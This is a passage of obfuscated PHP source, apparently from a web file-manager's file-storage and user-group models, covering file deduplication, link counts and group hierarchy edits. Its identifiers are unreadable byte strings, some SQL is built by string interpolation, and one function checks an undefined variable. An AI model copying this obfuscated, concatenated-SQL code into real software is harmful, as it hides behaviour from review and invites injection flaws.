!Cache::get($…‡¥‘°Ï)) { $ìúÂì˜š = !0; $Ïöãå¾£ = IO::mkdir($¸ğ‘ÅÅ„); if (!IO::exist($Ïöãå¾£ . $ãÇÖ¶©Û[795])) { IO::mkfile($Ïöãå¾£ . $ãÇÖ¶©Û[795]); } Cache::set($…‡¥‘°Ï, 1, 3600 * 2); } return $¢Üëºƒ¹; } public function makeFilePath($»®ìêù, $èÊ¶×’, $Ã¦áË®“ = false, $ÖÌí¸ó­ = false) { $›İíòı· =& $_SERVER[Ôó‡è­ƒ]; $ÕşôùÍ = Model($›İíòı·[768])->get($›İíòı·[1875]); $ü¨º¥ÔÈ = KodIO::defaultIO() . date($›İíòı·[1876]); $Û©•Šƒ² = $ü¨º¥ÔÈ . rand_string(5) . short_id(100); $»®ìêù = str_replace($›İíòı·[8], $›İíòı·[11], KodIO::clear($»®ìêù)); $Ó¬‹ÙôË = $èÊ¶×’->ext($»®ìêù); if (!$»®ìêù) { $ÕşôùÍ = $›İíòı·[1877]; } switch ($ÕşôùÍ) { case $›İíòı·[1878]: $Û©•Šƒ² = $Û©•Šƒ² . $›İíòı·[10] . $èÊ¶×’->ext($»®ìêù); if ($Ó¬‹ÙôË == $›İíòı·[1816]) { $Û©•Šƒ² .= $›İíòı·[1551]; } break; case $›İíòı·[1879]: $¼•öÌÂƒ = Model($›İíòı·[768])->get($›İíòı·[769]); $”åêŒÖü = substr(md5($›İíòı·[770] . $¼•öÌÂƒ . date($›İíòı·[746])), 0, 8); $îµØÄ»¶ = KodIO::defaultDriver(); $ü¨º¥ÔÈ = $›İíòı·[1227] . $îµØÄ»¶[$›İíòı·[396]] . $›İíòı·[406] . date($›İíòı·[1880]) . $”åêŒÖü . $›İíòı·[8]; if ($Ó¬‹ÙôË == $›İíòı·[1816]) { $»®ìêù .= $›İíòı·[1551]; } $âÊ‘ßÖŸ = $›İíòı·[1881] . $ü¨º¥ÔÈ . $»®ìêù; CacheLock::lock($âÊ‘ßÖŸ); $Û©•Šƒ² = $ü¨º¥ÔÈ . $»®ìêù; if (IO::exist($ü¨º¥ÔÈ . $»®ìêù)) { $ğ˜ÃÁŠ = substr($»®ìêù, 0, strlen($»®ìêù) - strlen($Ó¬‹ÙôË)); $ÀéíİˆÍ = $ÖÌí¸ó­ ? substr($ÖÌí¸ó­, 0, 5) : ($Ã¦áË®“ ? substr($Ã¦áË®“, 0, 5) : rand_string(5)); $Û©•Šƒ² = $ü¨º¥ÔÈ . $ğ˜ÃÁŠ . $ÀéíİˆÍ . $›İíòı·[10] . $Ó¬‹ÙôË; } if (IO::isTypeObject($Û©•Šƒ²) && !IO::isUploadServer($Û©•Šƒ²)) { if (IO::exist($Û©•Šƒ²)) { return $Û©•Šƒ²; } $ÆÁÁ›‘Ñ = IO::setContent($Û©•Šƒ², $›İíòı·[12]); if (!$ÆÁÁ›‘Ñ) { show_json($›İíòı·[1882], !1); } } CacheLock::unlock($âÊ‘ßÖŸ); break; case $›İíòı·[1877]: break; default: break; } return $Û©•Šƒ²; } public function addFileByRemote($×Ş“¦¹‡, $› ¾“³”, $î÷ÕÈ™Î = array()) { $Š¯¸³ŸÅ =& $_SERVER[Ôó‡è­ƒ]; if (!IO::exist($×Ş“¦¹‡)) { return !1; } $Ü“ßÕÕ = $î÷ÕÈ™Î[$Š¯¸³ŸÅ[173]] ? $î÷ÕÈ™Î[$Š¯¸³ŸÅ[173]] : $Š¯¸³ŸÅ[12]; $ƒóš€ ™ = IO::hashMd5($×Ş“¦¹‡, $Ü“ßÕÕ); $—âÓáÜ = KodIO::defaultDriver(); $´½Î¨© = array($Š¯¸³ŸÅ[578] => IO::size($×Ş“¦¹‡), $Š¯¸³ŸÅ[1883] => 1, $Š¯¸³ŸÅ[417] => $› ¾“³”, $Š¯¸³ŸÅ[806] => $—âÓáÜ[$Š¯¸³ŸÅ[396]], $Š¯¸³ŸÅ[418] => $×Ş“¦¹‡, $Š¯¸³ŸÅ[1884] => $î÷ÕÈ™Î[$Š¯¸³ŸÅ[174]] ? $î÷ÕÈ™Î[$Š¯¸³ŸÅ[174]] : IO::hashSimple($×Ş“¦¹‡), $Š¯¸³ŸÅ[1885] => $ƒóš€ ™ ? $ƒóš€ ™ : $Ü“ßÕÕ); if ($Œ”ÏÊß = $this->addFileCheckExist($´½Î¨©[$Š¯¸³ŸÅ[174]], $´½Î¨©[$Š¯¸³ŸÅ[173]], $´½Î¨©[$Š¯¸³ŸÅ[80]])) { return $Œ”ÏÊß; } return $this->addFileData($´½Î¨©); } private function addFileData($¡ËÌÓÔº) { $Á¨ƒÔªß =& $_SERVER[Ôó‡è­ƒ]; if (!$¡ËÌÓÔº) { return !1; } $¡ËÌÓÔº[$Á¨ƒÔªß[80]] = intval($¡ËÌÓÔº[$Á¨ƒÔªß[80]]); if (!$¡ËÌÓÔº[$Á¨ƒÔªß[80]] && strlen($¡ËÌÓÔº[$Á¨ƒÔªß[174]]) > 32) { $¡ËÌÓÔº[$Á¨ƒÔªß[80]] = intval(substr($¡ËÌÓÔº[$Á¨ƒÔªß[174]], 32)); } $»¹ğ¤÷û = $this->add($¡ËÌÓÔº); return $this->find($»¹ğ¤÷û); } public function addFile($¯ø¹å, $€Ä ’ÉØ, $¥Ä†«‰ = false) { $Á’ªÓ…½ =& $_SERVER[Ôó‡è­ƒ]; $ğœÇÏ¯ = IO::hashSimple($¯ø¹å); $”¿øÉ÷‰ = IO::size($¯ø¹å); $ÍŒïëÙ = $”¿øÉ÷‰ <= 1024 * 1024 * 10 ? IO::hashMd5($¯ø¹å) : $Á’ªÓ…½[12]; $ëÌğ¢è¿ = $Á’ªÓ…½[1886] . $ğœÇÏ¯; CacheLock::lock($ëÌğ¢è¿); if ($ÍŒïëÙ && $ğœÇÏ¯) { $³ü©º¡­ = $this->addFileCheckExist($ğœÇÏ¯, $ÍŒïëÙ, $”¿øÉ÷‰); if ($³ü©º¡­) { CacheLock::unlock($ëÌğ¢è¿); return $³ü©º¡­; } } $ú°×á = $this->addFileMake($¯ø¹å, $”¿øÉ÷‰, $ğœÇÏ¯, $ÍŒïëÙ, $€Ä ’ÉØ, $¥Ä†«‰); $éÃ£ˆ = $this->addFileData($ú°×á); CacheLock::unlock($ëÌğ¢è¿); if (!$ÍŒïëÙ && $éÃ£ˆ) { $this->fileMd5Check($éÃ£ˆ); } return $éÃ£ˆ; } private function fileMd5Check($ÏˆÜóèÇ) { $ÒÃ®Ï„ë =& $_SERVER[Ôó‡è­ƒ]; $êäõ³Çı = array($ÏˆÜóèÇ[$ÒÃ®Ï„ë[463]], $ÏˆÜóèÇ[$ÒÃ®Ï„ë[78]]); $„ Ê²ô = $ÒÃ®Ï„ë[1887] . $ÏˆÜóèÇ[$ÒÃ®Ï„ë[78]]; $¢áˆòô = $ÒÃ®Ï„ë[1888] . $ÏˆÜóèÇ[$ÒÃ®Ï„ë[463]]; $Šğ²´œÔ = TaskQueue::add($ÒÃ®Ï„ë[1889], $êäõ³Çı, $„ Ê²ô, $¢áˆòô); if (!$Šğ²´œÔ) { $this->fileMd5Set($ÏˆÜóèÇ[$ÒÃ®Ï„ë[463]], $ÏˆÜóèÇ[$ÒÃ®Ï„ë[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ñøßÒÀ, $±Õ¦ÚÖ®) { $ƒÅœÆ =& $_SERVER[Ôó‡è­ƒ]; $šò˜äÙ = $this->find($ñøßÒÀ); if (!$šò˜äÙ || $šò˜äÙ[$ƒÅœÆ[173]]) { return; } $Œ”Áƒî = IO::hashMd5($±Õ¦ÚÖ®); if (!$Œ”Áƒî) { return $ƒÅœÆ[12]; } $this->where(array($ƒÅœÆ[463] => $ñøßÒÀ))->save(array($ƒÅœÆ[173] => $Œ”Áƒî)); } public function addFileMake($Á„ÈÉÌ, $ø”Ì”„§, $¼ş•ÔÃ„, $è«Ô÷¶Ï, $Áµ‘”˜ê, $ó‰ĞèÊ–) { $ª›Ìğ¡ =& $_SERVER[Ôó‡è­ƒ]; $¿è °Îâ = $this->createFileName($Áµ‘”˜ê, $¼ş•ÔÃ„, $è«Ô÷¶Ï); $ŞŠäÎ©– = get_path_father($¿è °Îâ); $æ­ñÎÜµ = get_path_this($¿è °Îâ); if ($ó‰ĞèÊ–) { $Ø²ŸÛğš = IO::move($Á„ÈÉÌ, $ŞŠäÎ©–, !1, $æ­ñÎÜµ); } else { $Ø²ŸÛğš = IO::copy($Á„ÈÉÌ, $ŞŠäÎ©–, !1, $æ­ñÎÜµ); } if (!$Ø²ŸÛğš) { return !1; } $ö‘®°¦ö = KodIO::defaultDriver(); $‚·Û¶ÏŒ = array($ª›Ìğ¡[578] => $ø”Ì”„§, $ª›Ìğ¡[1883] => 1, $ª›Ìğ¡[417] => $Áµ‘”˜ê, $ª›Ìğ¡[806] => $ö‘®°¦ö[$ª›Ìğ¡[396]], $ª›Ìğ¡[418] => $¿è °Îâ, $ª›Ìğ¡[1884] => $¼ş•ÔÃ„, $ª›Ìğ¡[1885] => $è«Ô÷¶Ï); return $‚·Û¶ÏŒ; } public function addFileCheckExist($ğÓæœªÍ, $ÈËµÁäø, $ØÆêáÎ) { $æàÁ½ôÓ =& $_SERVER[Ôó‡è­ƒ]; $£¾®ú«‰ = $this->findByHash($ğÓæœªÍ, $ÈËµÁäø); if (!$£¾®ú«‰) { return !1; } $”‹¬›Ö° = array($æàÁ½ôÓ[1883] => intval($£¾®ú«‰[$æàÁ½ôÓ[1890]]) + 1, $æàÁ½ôÓ[578] => $ØÆêáÎ); $this->where(array($æàÁ½ôÓ[464] => $£¾®ú«‰[$æàÁ½ôÓ[463]]))->save($”‹¬›Ö°); return $£¾®ú«‰; } public function remove($áÀ™©á„) { $this->linkCountChange($áÀ™©á„, !1); $this->clearEmpty(); return !0; } public function linkAdd($„“›ùÓ­) { $this->linkCountChange($„“›ùÓ­, !0); } public function linkCountChange($†¬‡Î¡Î, $õÎİêÉş) { $¯İ¸‰º =& $_SERVER[Ôó‡è­ƒ]; if (!$†¬‡Î¡Î) { return; } if (!is_array($†¬‡Î¡Î)) { $†¬‡Î¡Î = array($†¬‡Î¡Î); } $†¾®²—Ô = array(); foreach ($†¬‡Î¡Î as $Ñ„Ê›·Ú) { $ô«şçÌË = $Ñ„Ê›·Ú . $¯İ¸‰º[12]; if (!$†¾®²—Ô[$ô«şçÌË]) { $†¾®²—Ô[$ô«şçÌË] = 0; } $†¾®²—Ô[$ô«şçÌË]++; } $¯ı¸õİ± = array(); foreach ($†¾®²—Ô as $Ñ„Ê›·Ú => $ü†”ÊÖú) { $ô«şçÌË = $ü†”ÊÖú . $¯İ¸‰º[12]; if (!$¯ı¸õİ±[$ô«şçÌË]) { $¯ı¸õİ±[$ô«şçÌË] = array(); } $¯ı¸õİ±[$ô«şçÌË][] = $Ñ„Ê›·Ú; } foreach ($¯ı¸õİ± as $ü†”ÊÖú => $—ÇöİÏ–) { if (!$—ÇöİÏ–) { continue; } $ü†”ÊÖú = $õÎİêÉş ? $ü†”ÊÖú : -intval($ü†”ÊÖú); $¶Ô£şå = array($¯İ¸‰º[463] => array($¯İ¸‰º[7], $—ÇöİÏ–)); if ($ü†”ÊÖú < 0) { $¶Ô£şå[$¯İ¸‰º[1890]] = array($¯İ¸‰º[1015], abs($ü†”ÊÖú)); } $this->where($¶Ô£şå)->setAdd($¯İ¸‰º[1890], $ü†”ÊÖú); } } public function findByHash($ËÀÉÏ¸‰, $¾¤û¯É³ = false) { $ŸÔÏ—´ =& $_SERVER[Ôó‡è­ƒ]; if (!$ËÀÉÏ¸‰ && !$¾¤û¯É³) { return !1; } $ø¾õ”Ù® = array($ŸÔÏ—´[1884] => $ËÀÉÏ¸‰); if ($¾¤û¯É³) { $ø¾õ”Ù® = array($ŸÔÏ—´[1885] => $¾¤û¯É³); } return $this->order($ŸÔÏ—´[1891])->where($ø¾õ”Ù®)->find(); } public function clearEmpty($ØĞ²ƒ­ = 0) { $¯›®Äì =& $_SERVER[Ôó‡è­ƒ]; $Àˆı¸Ñ² = time() - 3600 * 24 * $ØĞ²ƒ­; $œÖüöê¥ = $¯›®Äì[1892] . $Àˆı¸Ñ²; $€× §òÓ = $this->where($œÖüöê¥)->select(); if (!$€× §òÓ) { return; } $³©ÔæŞ¥ = new Task($¯›®Äì[1893], $¯›®Äì[12], count($€× §òÓ)); foreach ($€× §òÓ as $Ÿü„®óŸ) { $³©ÔæŞ¥->update(1); $this->resetFile($Ÿü„®óŸ); } $³©ÔæŞ¥->end(); } public function resetFile($•¯ƒğò) { $Â°¿’ê =& $_SERVER[Ôó‡è­ƒ]; $”¤ä³µ = array($Â°¿’ê[464] => $•¯ƒğò[$Â°¿’ê[463]]); $æ©ï«¤» = Model($Â°¿’ê[1325])->where($”¤ä³µ)->count(); $ßß“¹— = Model($Â°¿’ê[1894])->where($”¤ä³µ)->count(); $÷«µİŸ = intval($æ©ï«¤») + intval($ßß“¹—); if ($÷«µİŸ == 0) { IO::remove($•¯ƒğò[$Â°¿’ê[78]]); Model($Â°¿’ê[1895])->delete($•¯ƒğò[$Â°¿’ê[463]]); $this->where($”¤ä³µ)->delete(); $this->metaSet($•¯ƒğò[$Â°¿’ê[463]], null, null); return; } if ($•¯ƒğò[$Â°¿’ê[1890]] != $÷«µİŸ) { $this->where($”¤ä³µ)->save(array($Â°¿’ê[1883] => $÷«µİŸ)); } } public function storageInfo($€šµÌúÙ = false) { $¡£“¯ò =& $_SERVER[Ôó‡è­ƒ]; $€””ƒ¼œ = $this->count() + 0.0; $ì˜ü«†« = 0; $ü¬‰¨ó = 1; $·¿’¨Ğ¹ = 0; $±ú“Œ‚… = 5000; for ($ÖÉÓ’Å× = 0; $ÖÉÓ’Å× < $€””ƒ¼œ; $ÖÉÓ’Å× = $ÖÉÓ’Å× + $±ú“Œ‚…) { $´ÆˆØí = $this->limit($ÖÉÓ’Å×, $ÖÉÓ’Å× + $±ú“Œ‚…)->select(); foreach ($´ÆˆØí as $æÊ«Ø—) { $ü¬‰¨ó += $æÊ«Ø—[$¡£“¯ò[80]] * $æÊ«Ø—[$¡£“¯ò[1890]]; $ì˜ü«†« += $æÊ«Ø—[$¡£“¯ò[80]] * ($æÊ«Ø—[$¡£“¯ò[1890]] - 1); $·¿’¨Ğ¹ += $æÊ«Ø—[$¡£“¯ò[1890]]; } } $Ì—ëÕßì = array($¡£“¯ò[1896] => $ü¬‰¨ó, $¡£“¯ò[1897] => $ì˜ü«†«, $¡£“¯ò[1898] => $ì˜ü«†« / $ü¬‰¨ó, $¡£“¯ò[84] => $€””ƒ¼œ, $¡£“¯ò[1899] => $·¿’¨Ğ¹); return $Ì—ëÕßì; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\145" => "\147\x72\x6f\x75\160\137\x6d\145\x74\x61", "\x6d\145\164\x61\106\x69\x65\154\144" => "\147\162\157\x75\160\x49\x44"); protected function cacheFunctionAlias($‚•‚Ñâê) { $¡ëèˆ²õ =& $_SERVER[Ôó‡è­ƒ]; return array($¡ëèˆ²õ[1900] => array($‚•‚Ñâê[0], $¡ëèˆ²õ[1901]), $¡ëèˆ²õ[1902] => array($‚•‚Ñâê[0], $¡ëèˆ²õ[1903])); } protected function getInfo($ö“Ò§¥, $Åú–Ğø§ = false) { $§­ÆóóÊ = $this->getInfoSimple($ö“Ò§¥); if (!$§­ÆóóÊ) { return !1; } if ($Åú–Ğø§) { return $this->_listDataApplyItem($§­ÆóóÊ); } return $this->cacheFunctionGet($_SERVER[Ôó‡è­ƒ][1904], $ö“Ò§¥); } protected function getInfoSimple($Ö©áò¦¿, $íÀ’Ÿº = false) { $Â¦¡÷‹ =& $_SERVER[Ôó‡è­ƒ]; if ($íÀ’Ÿº) { $µÊô’¨ = array($Â¦¡÷‹[1823] => intval($Ö©áò¦¿)); $·ØıÓƒë = $this->where($µÊô’¨)->find(); return is_array($·ØıÓƒë) ? $·ØıÓƒë : array(); } return $this->cacheFunctionGet($Â¦¡÷‹[1905], $Ö©áò¦¿); } protected function groupAdd($ Ñ©ÚÛî) { $‰£¾…õÖ =& $_SERVER[Ôó‡è­ƒ]; if (!$ Ñ©ÚÛî[$‰£¾…õÖ[494]] && isset($ Ñ©ÚÛî[$‰£¾…õÖ[1823]]) && $ Ñ©ÚÛî[$‰£¾…õÖ[1823]] == 1) { if ($İÒåÀäİ = $this->getInfoSimple($ Ñ©ÚÛî[$‰£¾…õÖ[1823]], !0)) { return $ Ñ©ÚÛî[$‰£¾…õÖ[1823]]; } } else { $İÒåÀäİ = $this->getInfoSimple($ Ñ©ÚÛî[$‰£¾…õÖ[494]]); if (!$İÒåÀäİ) { return !1; } } $›Ù‘±ö = $‰£¾…õÖ[527]; if ($İÒåÀäİ[$‰£¾…õÖ[517]]) { $›Ù‘±ö = $İÒåÀäİ[$‰£¾…õÖ[517]] . $İÒåÀäİ[$‰£¾…õÖ[1823]] . $‰£¾…õÖ[50]; } $ßÇÃ™› = array($‰£¾…õÖ[417] => $this->groupNameAuto($ Ñ©ÚÛî[$‰£¾…õÖ[494]], $ Ñ©ÚÛî[$‰£¾…õÖ[32]]), $‰£¾…õÖ[398] => $ Ñ©ÚÛî[$‰£¾…õÖ[494]], $‰£¾…õÖ[583] => $›Ù‘±ö, $‰£¾…õÖ[1906] => $ Ñ©ÚÛî[$‰£¾…õÖ[1810]], $‰£¾…õÖ[1907] => 0, $‰£¾…õÖ[1827] => 0); if (isset($ Ñ©ÚÛî[$‰£¾…õÖ[1846]])) { $ßÇÃ™›[$‰£¾…õÖ[1846]] = $ Ñ©ÚÛî[$‰£¾…õÖ[1846]]; } else { $Üíøéù£ = $this->max($‰£¾…õÖ[1846]); if (!$Üíøéù£) { $Üíøéù£ = 0; } $ßÇÃ™›[$‰£¾…õÖ[1846]] = $Üíøéù£ + 1; } if (!empty($ Ñ©ÚÛî[$‰£¾…õÖ[1823]])) { $ßÇÃ™›[$‰£¾…õÖ[1823]] = $ Ñ©ÚÛî[$‰£¾…õÖ[1823]]; } $šİñ‰¶Ü = $this->add($ßÇÃ™›); $this->setNamePinyin($šİñ‰¶Ü, $ßÇÃ™›[$‰£¾…õÖ[32]]); if (isset($ Ñ©ÚÛî[$‰£¾…õÖ[1908]])) { $this->metaSet($šİñ‰¶Ü, array($‰£¾…õÖ[1908] => $ Ñ©ÚÛî[$‰£¾…õÖ[1908]], $‰£¾…õÖ[1909] => $ Ñ©ÚÛî[$‰£¾…õÖ[1909]])); unset($ Ñ©ÚÛî[$‰£¾…õÖ[1908]]); unset($ Ñ©ÚÛî[$‰£¾…õÖ[1909]]); } Model($‰£¾…õÖ[1325])->groupRootAdd($šİñ‰¶Ü); return $šİñ‰¶Ü; } protected function groupEdit($‰û¤ã·, $ıÚÄÇ”Ç) { $¾¥åÊ“ =& $_SERVER[Ôó‡è­ƒ]; $ˆ°½«¾ = $this->getInfoSimple($‰û¤ã·); if (!$ˆ°½«¾) { return !1; } if (!empty($ıÚÄÇ”Ç[$¾¥åÊ“[494]])) { $·Ñ¤Àú± = $this->getInfoSimple($ıÚÄÇ”Ç[$¾¥åÊ“[494]]); if (!$·Ñ¤Àú±) { return !1; } if ($ˆ°½«¾[$¾¥åÊ“[1823]] == $·Ñ¤Àú±[$¾¥åÊ“[1823]]) { return !1; } if ($ıÚÄÇ”Ç[$¾¥åÊ“[494]] != $ˆ°½«¾[$¾¥åÊ“[494]]) { if ($·Ñ¤Àú±[$¾¥åÊ“[517]] !== $ˆ°½«¾[$¾¥åÊ“[517]] && strpos($·Ñ¤Àú±[$¾¥åÊ“[517]], $ˆ°½«¾[$¾¥åÊ“[517]] . $ˆ°½«¾[$¾¥åÊ“[1823]] . $¾¥åÊ“[50]) === 0) { return !1; } $ıÚÄÇ”Ç[$¾¥åÊ“[583]] = $·Ñ¤Àú±[$¾¥åÊ“[517]] . $ıÚÄÇ”Ç[$¾¥åÊ“[494]] . $¾¥åÊ“[50]; $this->_changeChildLevel($ˆ°½«¾, $·Ñ¤Àú±); } } if (isset($ıÚÄÇ”Ç[$¾¥åÊ“[32]])) { $this->setNamePinyin($‰û¤ã·, $ıÚÄÇ”Ç[$¾¥åÊ“[32]]); } if (isset($ıÚÄÇ”Ç[$¾¥åÊ“[1908]])) { $this->metaSet($‰û¤ã·, array($¾¥åÊ“[1908] => $ıÚÄÇ”Ç[$¾¥åÊ“[1908]], $¾¥åÊ“[1909] => $ıÚÄÇ”Ç[$¾¥åÊ“[1909]])); unset($ıÚÄÇ”Ç[$¾¥åÊ“[1908]]); unset($ıÚÄÇ”Ç[$¾¥åÊ“[1909]]); } $this->_clearChildrenCache($ˆ°½«¾); return $this->where(array($¾¥åÊ“[1910] => $‰û¤ã·))->save($ıÚÄÇ”Ç); } private function _clearChildrenCache($°›ƒ£Ï‚) { $Â¾¢°© =& $_SERVER[Ôó‡è­ƒ]; $¯¼ìªõœ = array($Â¾¢°©[583] => array($Â¾¢°©[543], $°›ƒ£Ï‚[$Â¾¢°©[517]] . $°›ƒ£Ï‚[$Â¾¢°©[1823]] . $Â¾¢°©[544])); $œ‹Å¦¼¹ = $this->field($Â¾¢°©[1823])->where($¯¼ìªõœ)->select(); foreach ($œ‹Å¦¼¹ as $Ñ¯Á£¤) { $this->_clearCache($Ñ¯Á£¤[$Â¾¢°©[1823]]); } } private function _clearCache($­”¿„‹É) { $Š¯ş›ÌÎ =& $_SERVER[Ôó‡è­ƒ]; $this->cacheFunctionClear($Š¯ş›ÌÎ[1904], $­”¿„‹É); $this->cacheFunctionClear($Š¯ş›ÌÎ[1905], $­”¿„‹É); } private function _changeChildLevel($ˆêË„·Ë, $‰ÇÔ›¡š, $…—æÈ°å = false) { $Û¸ù¯º³ =& $_SERVER[Ôó‡è­ƒ]; $å‹ªğ‰€ = $ˆêË„·Ë[$Û¸ù¯º³[517]] . $ˆêË„·Ë[$Û¸ù¯º³[1823]] . $Û¸ù¯º³[50]; $íïĞŠ = $‰ÇÔ›¡š[$Û¸ù¯º³[517]] . $‰ÇÔ›¡š[$Û¸ù¯º³[1823]] . $Û¸ù¯º³[50] . $ˆêË„·Ë[$Û¸ù¯º³[1823]] . $Û¸ù¯º³[50]; if ($…—æÈ°å) { $íïĞŠ = $‰ÇÔ›¡š[$Û¸ù¯º³[517]] . $‰ÇÔ›¡š[$Û¸ù¯º³[1823]] . $Û¸ù¯º³[50]; } $ß¾¢ôçœ = array($Û¸ù¯º³[583] => array($Û¸ù¯º³[543], $ˆêË„·Ë[$Û¸ù¯º³[517]] . $ˆêË„·Ë[$Û¸ù¯º³[1823]] . $Û¸ù¯º³[544])); $ƒªîÖ¡Ë = array($Û¸ù¯º³[583] => array($Û¸ù¯º³[592], "\162\145\160\x6c\141\143\x65\50\x70\141\x72\x65\x6e\164\x4c\x65\x76\145\154\54\47{$å‹ªğ‰€}\47\x2c\x27{$íïĞŠ}\x27\51")); $this->_clearChildrenCache($ˆêË„·Ë); $this->where($ß¾¢ôçœ)->data($ƒªîÖ¡Ë)->save(); } public function setNamePinyin($Ì“±¿ÅÙ, $¹Á´„âé = false) { $â‹ıóîä =& $_SERVER[Ôó‡è­ƒ]; if (!$¹Á´„âé) { $âÄ“é÷ = $this->getInfoSimple($Ì“±¿ÅÙ); $¹Á´„âé = $âÄ“é÷[$â‹ıóîä[32]]; } if (!Input::check($¹Á´„âé, $â‹ıóîä[586])) { $this->metaSet($Ì“±¿ÅÙ, $â‹ıóîä[460], null); $this->metaSet($Ì“±¿ÅÙ, $â‹ıóîä[459], null); return; } $Ãá¢††¡ = array($â‹ıóîä[460] => str_replace($â‹ıóîä[53], $â‹ıóîä[12], Pinyin::get($¹Á´„âé)), $â‹ıóîä[459] => Pinyin::get($¹Á´„âé, $â‹ıóîä[587])); $this->metaSet($Ì“±¿ÅÙ, $Ãá¢††¡); } protected function groupStatus($À–­³´Ú, $¯¿ïÈ±) { $™î½öû =& $_SERVER[Ôó‡è­ƒ]; $¬¼˜ƒ”Ÿ = $this->getInfoSimple($À–­³´Ú); if (!$¬¼˜ƒ”Ÿ) { return !1; } if ($¯¿ïÈ± == $™î½öû[89]) { $ËÉ¥İ²Ñ = $this->parentLevelArray($¬¼˜ƒ”Ÿ[$™î½öû[517]]); } else { $Æ¡ò‰ŞÈ = array($™î½öû[583] => array($™î½öû[543], $¬¼˜ƒ”Ÿ[$™î½öû[517]] . $¬¼˜ƒ”Ÿ[$™î½öû[1823]] . $™î½öû[544])); $ËÉ¥İ²Ñ = $this->where($Æ¡ò‰ŞÈ)->field($™î½öû[1823])->select(); $ËÉ¥İ²Ñ = array_to_keyvalue($ËÉ¥İ²Ñ, $™î½öû[12], $™î½öû[1823]); } $ËÉ¥İ²Ñ[] = $¬¼˜ƒ”Ÿ[$™î½öû[1823]]; $åà”œõ = array(); foreach ($ËÉ¥İ²Ñ as $À–­³´Ú) { $åà”œõ[] = array($™î½öû[1823] => $À–­³´Ú, $™î½öû[95] => $™î½öû[748], $™î½öû[373] => $¯¿ïÈ±); $this->_clearCache($À–­³´Ú); } return Model($™î½öû[1911])->addAll($åà”œõ, array(), !0); } protected function groupRemove($ùæëĞÄş, $Àà†‹¾¬ = false) { $ç÷şÃ´ =& $_SERVER[Ôó‡è­ƒ]; $ııöÃ§ = array($ç÷şÃ´[1823] => $ùæëĞÄş); $ÆôşÜ = $this->where($ııöÃ§)->find(); if (!$ÆôşÜ || $ÆôşÜ[$ç÷şÃ´[494]] == 0) { return !1; } if (!$Àà†‹¾¬) { $¼ƒÈ´™ = $this->getInfoSimple($ÆôşÜ[$ç÷şÃ´[494]]); $this->_changeChildLevel($ÆôşÜ, $¼ƒÈ´™, !0); $this->where(array($ç÷şÃ´[494] => $ùæëĞÄş))->save(array($ç÷şÃ´[494] => $ÆôşÜ[$ç÷şÃ´[494]])); } Model($ç÷şÃ´[1911])->where($ııöÃ§)->delete(); Model($ç÷şÃ´[1912])->where($ııöÃ§)->delete(); Model($ç÷şÃ´[823])->groupRootRemove($ùæëĞÄş); return $this->where($ııöÃ§)->delete(); } protected function groupSort($Ó­¡˜ğ) { $ÇÌ½ı—¼ =& $_SERVER[Ôó‡è­ƒ]; $¤º˜ì = array(); foreach ($Ó­¡˜ğ as $ƒË‡Í‚¼ => $½ƒ¼Â) { $¤º˜ì[] = array($ÇÌ½ı—¼[1823], $½ƒ¼Â, $ÇÌ½ı—¼[1846], $ƒË‡Í‚¼ + 1); } $this->saveAll($¤º˜ì); } public function listData() { $†²‹ş±æ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($†²‹ş±æ[$_SERVER[Ôó‡è­ƒ][368]]); return $†²‹ş±æ; } private function _makeOrder($«š¸Èú£ = '') { $ÀäÕÍ•Ÿ =& $_SERVER[Ôó‡è­ƒ]; $†£ıÍÁá = array($ÀäÕÍ•Ÿ[1823], $ÀäÕÍ•Ÿ[32], $ÀäÕÍ•Ÿ[1812], $ÀäÕÍ•Ÿ[197]); $Ãä‘÷Ô = array($ÀäÕÍ•Ÿ[444] => $ÀäÕÍ•Ÿ[445], $ÀäÕÍ•Ÿ[446] => $ÀäÕÍ•Ÿ[447]); $˜Šö™ê = Input::get($ÀäÕÍ•Ÿ[451], $ÀäÕÍ•Ÿ[7], $ÀäÕÍ•Ÿ[1827], $†£ıÍÁá); $Å— »Ô = Input::get($ÀäÕÍ•Ÿ[452], $ÀäÕÍ•Ÿ[7], $ÀäÕÍ•Ÿ[1913], array($ÀäÕÍ•Ÿ[1913], $ÀäÕÍ•Ÿ[446])); $Å— »Ô = $Ãä‘÷Ô[$Å— »Ô]; $«š¸Èú£ = $«š¸Èú£ . "{$˜Šö™ê}\x20{$Å— »Ô}\x2c\x20\147\162\x6f\x75\x70\x49\104\40\141\163\143"; return $this->order($«š¸Èú£); } public function listChild($Ì‘ÄÉ) { $¶ãÜÀÑÙ =& $_SERVER[Ôó‡è­ƒ]; $²±‹œöÀ = $this->where(array($¶ãÜÀÑÙ[494] => $Ì‘ÄÉ))->_makeOrder()->selectPage(200); $this->_listDataApply($²±‹œöÀ[$¶ãÜÀÑÙ[368]]); return $²±‹œöÀ; } public function listChildIds($‰àò™—) { $Å‡•â¨¸ =& $_SERVER[Ôó‡è­ƒ]; if (is_string($Œ¥ºœ÷Ü)) { $‰àò™— = explode($Å‡•â¨¸[50], $‰àò™—); } $°¦º¥Šå = $this->where(array($Å‡•â¨¸[1823] => array($Å‡•â¨¸[7], $‰àò™—)))->field($Å‡•â¨¸[1914])->select(); if (!$°¦º¥Šå) { return !1; } $¹â˜½ˆ = array(); foreach ($°¦º¥Šå as $À«üõ¶Š) { $¹â˜½ˆ[] = "\163\145\154\x65\143\164\40\x67\162\157\165\160\x49\x44\x20\x66\162\x6f\155\x20\140\147\x72\157\165\x70\x60\40\167\150\x65\162\x65\x20\x70\141\x72\x65\156\x74\x4c\x65\166\145\x6c\40\154\151\x6b\x65\x20\47{$À«üõ¶Š[$Å‡•â¨¸[517]]}{$À«üõ¶Š[$Å‡•â¨¸[1823]]}\54\x25\x27"; } $¹â˜½ˆ = implode($Å‡•â¨¸[1915], $¹â˜½ˆ); $°¦º¥Šå = $this->query($¹â˜½ˆ); if (!$°¦º¥Šå) { return array(); } $‰àò™— = array_to_keyvalue($°¦º¥Šå, $Å‡•â¨¸[12], $Å‡•â¨¸[1823]); return array_unique($‰àò™—); } public function listByID($¡œ°’Ï) { $¾ìöö£ =& $_SERVER[Ôó‡è­ƒ]; if (!$¡œ°’Ï) { return array(); } $ëÓºØ·Ì = array($¾ìöö£[1823] => array($¾ìöö£[7], $¡œ°’Ï)); $„ ö©¨ = $this->where($ëÓºØ·Ì)->select(); $„ ö©¨ = 